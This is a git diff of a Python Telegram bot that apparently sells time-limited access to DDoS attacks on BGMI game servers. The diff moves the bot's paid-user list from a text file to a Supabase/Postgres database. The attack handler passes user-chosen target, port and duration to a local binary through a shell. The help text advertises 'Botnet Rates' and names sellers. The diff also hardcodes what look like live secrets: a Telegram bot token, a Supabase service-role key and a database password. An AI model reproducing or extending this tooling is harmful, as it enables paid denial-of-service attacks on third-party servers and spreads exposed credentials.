@@ -11,127 +11,187 @@ import time
 import logging
 import socket
 import pytz  # Import pytz for timezone handling
+from supabase import create_client, Client
+import psycopg2
+import threading
+import re
 
-bot = telebot.TeleBot('7858493439:AAGbtHzHHZguQoJzAney4Ccer1ZUisC-bDI')
-
-# Admin user IDs
 admin_id = ["7418099890"]
 admin_owner = ["7418099890"]
-
-# File to store allowed user IDs and their expiration times
-USER_FILE = "users.txt"
-cooldown_timestamps = {}
-# File to store command logs
-LOG_FILE = "log.txt"
 os.system('chmod +x *')
-# Set Indian Standard Time (IST)
+
+import os
+url = os.getenv("https://yxffpwhflqaapiwcpknf.supabase.co")
+key = os.getenv("eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Inl4ZmZwd2hmbHFhYXBpd2Nwa25mIiwicm9sZSI6InNlcnZpY2Vfcm9sZSIsImlhdCI6MTczMjI3MzI5MywiZXhwIjoyMDQ3ODQ5MjkzfQ.WbVl0CoK25HVrFzchTnD7-AI-lPH8l_Vb1MbLQKT5NQ")
+
+# Supabase credentials (replace with your actual credentials)
+url = "https://yxffpwhflqaapiwcpknf.supabase.co"  # Supabase project URL
+key = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Inl4ZmZwd2hmbHFhYXBpd2Nwa25mIiwicm9sZSI6InNlcnZpY2Vfcm9sZSIsImlhdCI6MTczMjI3MzI5MywiZXhwIjoyMDQ3ODQ5MjkzfQ.WbVl0CoK25HVrFzchTnD7-AI-lPH8l_Vb1MbLQKT5NQ"  # Supabase anonymous API key
+supabase: Client = create_client(url, key)
+
+bot = telebot.TeleBot('7858493439:AAEDGY4WNmZkDHMFwwUbarXWmO3GXc8rB2s')
+
+# Setup timezone (IST)
 IST = pytz.timezone('Asia/Kolkata')
 
-# Absolute path to the ak.bin file (modify this to point to the correct path)
-AK_BIN_PATH = 'KALUAA'
+# Database connection details
+connection = psycopg2.connect(
+    host="aws-0-ap-south-1.pooler.supabase.com",
+    database="postgres",
+    user="postgres.yxffpwhflqaapiwcpknf",
+    password="Uthaya$4123",
+    port=6543
+)
+cursor = connection.cursor()
 
-# Function to read user IDs and their expiration times from the file
-def read_users():
+USER_TABLE = "users"  # Replace with your actual table name
+
+from datetime import datetime
+import pytz
+
+# Set up the timezone (Asia/Kolkata)
+IST = pytz.timezone('Asia/Kolkata')
+
+def save_user(user_id, expiration_time):
     try:
-        with open(USER_FILE, "r") as file:
-            lines = file.read().splitlines()
-            users = {}
-            for line in lines:
-                if line.strip():  # Check if line is not empty
-                    user_info = line.split()
-                    if len(user_info) == 2:
-                        user_id, expiration_time = user_info
-                        users[user_id] = datetime.fromisoformat(expiration_time).astimezone(IST)
-            return users
-    except FileNotFoundError:
-        return {}
+        expiration_time_str = expiration_time.strftime("%Y-%m-%d %H:%M:%S")
+        cursor.execute(f"INSERT INTO {USER_TABLE} (user_id, expiration_time) VALUES (%s, %s)", (user_id, expiration_time_str))
+        connection.commit()
+    except Exception as e:
+        logging.error(f"Error saving user {user_id}: {e}")
+        connection.rollback()
 
-# Function to save users to file
-def save_users(users):
-    with open(USER_FILE, "w") as file:
-        for user_id, expiration_time in users.items():
-            file.write(f"{user_id} {expiration_time.isoformat()}\n")
+# Function to read users from the database
+def read_users():
+    cursor.execute(f"SELECT user_id, expiration_time FROM {USER_TABLE}")
+    users = cursor.fetchall()
+    
+    # Convert expiration_time to datetime and return a dictionary of users
+    user_dict = {}
+    for user_id, expiration_time in users:
+        # Ensure expiration_time is timezone-aware
+        if expiration_time.tzinfo is None:  # Check if naive (no timezone)
+            expiration_time = IST.localize(expiration_time)  # Localize it to IST
+        
+        user_dict[user_id] = expiration_time
+    return user_dict
 
-# Function to remove expired users
+# Handler for removing a user
 def remove_expired_users():
-    users = read_users()
-    current_time = datetime.now(IST)
-  # Ensure current time is in IST
-    print(f"Current time: {current_time}")  # Debug log
-    expired_users = []
-    for user_id, exp_time in users.items():
-        print(f"Checking user {user_id}, Expiration: {exp_time}")  # Debug log
-        # Ensure expired user check works by comparing current time and expiration time
-        if exp_time <= current_time:
-            expired_users.append(user_id)
-            print(f"User {user_id} has expired and will be removed.")  # Debug log
+    current_time = datetime.now(IST)  # Get the current time in IST
+    try:
+        # Delete users whose expiration time has passed
+        cursor.execute(f"DELETE FROM {USER_TABLE} WHERE expiration_time < %s", (current_time.strftime("%Y-%m-%d %H:%M:%S"),))
+        connection.commit()
+    except Exception as e:
+        logging.error(f"Error while removing expired users: {e}")
+        print(f"Error while removing expired users: {e}")
+        connection.rollback()  # Rollback the transaction on error
 
-    for user_id in expired_users:
-        del users[user_id]
+# Periodically check and remove expired users
+def periodic_expiration_check(interval=60):
+    while True:
+        remove_expired_users()
+        time.sleep(interval)
 
-    if expired_users:
-        save_users(users)
-        print(f"Removed expired users: {expired_users}")  # Debug log
-    else:
-        print("No expired users to remove.")  # Debug log
+# Start periodic expiration check in a background thread
+def start_periodic_expiration_check():
+    expiration_thread = threading.Thread(target=periodic_expiration_check, args=(60,), daemon=True)
+    expiration_thread.start()
+
+# Call the function to start periodic expiration checks when the script is executed
+start_periodic_expiration_check()
+# Handler for adding a user
+def parse_time_input(time_input):
+    # Use regex to extract the number and unit (e.g., 1m, 2h, 3d)
+    match = re.match(r"(\d+)([mhd])", time_input)
+    if match:
+        number = int(match.group(1))
+        unit = match.group(2)
+
+        if unit == "m":
+            return timedelta(minutes=number)
+        elif unit == "h":
+            return timedelta(hours=number)
+        elif unit == "d":
+            return timedelta(days=number)
+    return None
 
 @bot.message_handler(commands=['add'])
 def add_user(message):
-    remove_expired_users()  # Check for expired users
-    user_id = str(message.chat.id)
-    if user_id in admin_owner:
-        command = message.text.split()
-        if len(command) == 3:
-            user_to_add = command[1]
-            minutes = int(command[2])
-            expiration_time = datetime.now(IST) + timedelta(minutes=minutes)  # Set expiration in IST
-            
-            users = read_users()
-            if user_to_add not in users:
-                users[user_to_add] = expiration_time
-                save_users(users)
-                response = f"User {user_to_add} added successfully with expiration time of {minutes} minutes."
-            else:
-                response = "User already exists."
-        else:
-            response = "Please specify a user ID and the expiration time in minutes."
-    else:
-        response = "Only Admin Can Run This Command."
+    try:
+        user_id = str(message.chat.id)
 
-    bot.reply_to(message, response)
+        if user_id in admin_owner:
+            command = message.text.split()
+
+            if len(command) == 3:
+                user_to_add = command[1]
+                time_input = command[2]
+
+                # Parse the time input
+                time_delta = parse_time_input(time_input)
+                
+                if time_delta:
+                    # Calculate expiration time
+                    expiration_time = datetime.now(IST) + time_delta
+                    save_user(user_to_add, expiration_time)
+
+                    response = (f"User {user_to_add} added successfully.\n"
+                                f"Access valid for {time_input} (Expires at: {expiration_time.strftime('%Y-%m-%d %H:%M:%S')} IST).")
+                else:
+                    response = "Error: Please specify a valid time format (e.g., 1m, 2h, 3d)."
+            else:
+                response = "Usage: /add <user_id> <time_in_format_m/h/d>"
+        else:
+            response = "Only Admin Can Run This Command."
+        
+        bot.reply_to(message, response)
+
+    except Exception as e:
+        logging.error(f"Error in /add command: {e}")
+        bot.reply_to(message, "An error occurred while processing your request. Please try again.")
 
 @bot.message_handler(commands=['remove'])
 def remove_user(message):
-    user_id = str(message.chat.id)
-    if user_id in admin_owner:
-        command = message.text.split()
-        if len(command) == 2:
-            user_to_remove = command[1]
-            users = read_users()
-            if user_to_remove in users:
-                del users[user_to_remove]
-                save_users(users)
-                response = f"User {user_to_remove} removed successfully."
-            else:
-                response = "User not found."
-        else:
-            response = "Please specify a user ID to remove."
-    else:
-        response = "Only Admin Can Run This Command."
+    try:
+        user_id = str(message.chat.id)
 
-    bot.reply_to(message, response)
+        if user_id in admin_owner:
+            command = message.text.split()
+
+            if len(command) == 2:
+                user_to_remove = command[1]
+
+                # Remove the user from the database
+                cursor.execute(f"DELETE FROM {USER_TABLE} WHERE user_id = %s", (user_to_remove,))
+                connection.commit()
+
+                response = f"User {user_to_remove} has been removed successfully."
+            else:
+                response = "Usage: /remove <user_id>"
+        else:
+            response = "Only Admin Can Run This Command."
+
+        bot.reply_to(message, response)
+
+    except Exception as e:
+        logging.error(f"Error in /remove command: {e}")
+        bot.reply_to(message, "An error occurred while processing your request. Please try again.")
+
 
 @bot.message_handler(commands=['allusers'])
 def show_all_users(message):
-    remove_expired_users()  # Check for expired users
     user_id = str(message.chat.id)
     if user_id in admin_owner:
-        users = read_users()
+        users = read_users()  # Fetch from Supabase
         response = "Authorized Users:\n"
         current_time = datetime.now(IST)
-  # Get current time in IST
-        active_users = [user_id for user_id, exp_time in users.items() if exp_time > current_time]
-        
+
+        active_users = [
+            user_id for user_id, exp_time in users.items() if exp_time > current_time
+        ]
+
         if active_users:
             for user_id in active_users:
                 response += f"- {user_id} (Expires at: {users[user_id]})\n"
@@ -166,7 +226,7 @@ def start_attack_reply(message, target, port, time):
     response = f"{username}, 𝐀𝐓𝐓𝐀𝐂𝐊 𝐒𝐓𝐀𝐑𝐓𝐄𝐃.\n\n𝐓𝐚𝐫𝐠𝐞𝐭: {target}\n𝐏𝐨𝐫𝐭: {port}\n𝐓𝐢𝐦𝐞: {time} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬\n𝐌𝐞𝐭𝐡𝐨𝐝: BGMI\nBY @its_MATRIX_King"
     bot.reply_to(message, response)
 
-    full_command = f"./Moin {target} {port} {time} 200"
+    full_command = f"./matrix {target} {port} {time}"
     try:
         print(f"Executing command: {full_command}")  # Log the command
         result = subprocess.run(full_command, shell=True, capture_output=False, text=True)
@@ -293,29 +353,40 @@ def handle_matrix(message):
 
 @bot.message_handler(commands=['help'])
 def show_help(message):
-    user_id = str(message.chat.id)
+    try:
+        user_id = str(message.chat.id)
 
-    with open('owner.txt', "r") as file:
-        owners = file.read().splitlines()
-
-    help_text = '''Available commands:
-    /matrix : Method For Bgmi Servers. 
-    /rulesanduse : Please Check Before Use !!.
-    /plan : Checkout Our Botnet Rates.
+        # Basic help text for all users
+        help_text = '''Available Commands:
+    - /matrix : Execute a BGMI server attack (specific conditions apply).
+    - /rulesanduse : View usage rules and important guidelines.
+    - /plan : Check available plans and pricing for the bot.
+    - /status : View ongoing attack details.
+    - /id : Retrieve your user ID.
     '''
 
-    if user_id in owners:
-        help_text += '''
-To See Admin Commands:
-    /admincmd : Shows All Admin Commands.
-        '''
+        # Check if the user is an admin and append admin commands
+        if user_id in admin_id:
+            help_text += '''
+Admin Commands:
+    - /add <user_id> <time_in_minutes> : Add a user with specified time.
+    - /remove <user_id> : Remove a user from the authorized list.
+    - /allusers : List all authorized users.
+    - /broadcast : Send a broadcast message to all users.
+    '''
 
-    help_text += ''' 
+        # Footer with channel and owner information
+        help_text += ''' 
 JOIN CHANNEL - @MATRIX_CHEATS
 BUY / OWNER - @its_MATRIX_King
-    '''
+'''
 
-    bot.reply_to(message, help_text)
+        # Send the constructed help text to the user
+        bot.reply_to(message, help_text)
+    
+    except Exception as e:
+        logging.error(f"Error in /help command: {e}")
+        bot.reply_to(message, "An error occurred while fetching help. Please try again.")
     
 @bot.message_handler(commands=['start'])
 def welcome_start(message):
@@ -369,6 +440,8 @@ def welcome_plan(message):
         response = "You do not have permission to access admin commands."
         bot.reply_to(message, response)
 
+
+# Handler for broadcasting a message
 @bot.message_handler(commands=['broadcast'])
 def broadcast_message(message):
     user_id = str(message.chat.id)
@@ -376,17 +449,16 @@ def broadcast_message(message):
         command = message.text.split(maxsplit=1)
         if len(command) > 1:
             message_to_broadcast = "Message To All Users By Admin:\n\n" + command[1]
-            with open('users.txt', "r") as file:
-                users = file.read().splitlines()
-                if users:
-                    for user in users:
-                        try:
-                            bot.send_message(user, message_to_broadcast)
-                        except Exception as e:
-                            print(f"Failed to send broadcast message to user {user}: {str(e)}")
-                    response = "Broadcast Message Sent Successfully To All Users."
-                else:
-                    response = "No users found in users.txt."
+            users = read_users()  # Get users from Redis
+            if users:
+                for user in users:
+                    try:
+                        bot.send_message(user, message_to_broadcast)
+                    except Exception as e:
+                        print(f"Failed to send broadcast message to user {user}: {str(e)}")
+                response = "Broadcast Message Sent Successfully To All Users."
+            else:
+                response = "No users found in the system."
         else:
             response = "Please Provide A Message To Broadcast."
     else:
